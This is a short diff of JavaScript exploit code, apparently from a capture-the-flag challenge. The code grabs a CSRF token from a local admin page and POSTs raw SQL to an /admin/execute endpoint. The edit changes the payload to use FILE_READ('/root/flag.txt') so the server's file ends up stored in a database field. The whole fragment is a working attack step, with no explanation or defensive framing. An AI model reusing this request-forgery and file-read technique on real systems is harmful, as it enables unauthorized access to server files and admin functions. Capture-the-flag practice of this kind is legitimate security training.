@@ -18,7 +18,7 @@ fetch('http://127.0.0.1/admin')
     const flag = match ? match[1] : html.substring(0, 500);
 
     const csrf2 = html.match(/name="csrf" value="([^"]+)"/)[1];
-    const insertPayload = `UPDATE ScrapeResult SET pageTitle='` + flag + `' WHERE id=1`;
+    const insertPayload = `UPDATE ScrapeResult SET pageTitle = FILE_READ('/root/flag.txt') WHERE id = 1`;
     return fetch('http://127.0.0.1/admin/execute', {
       method: 'POST',
       headers: {'Content-Type': 'application/x-www-form-urlencoded'},
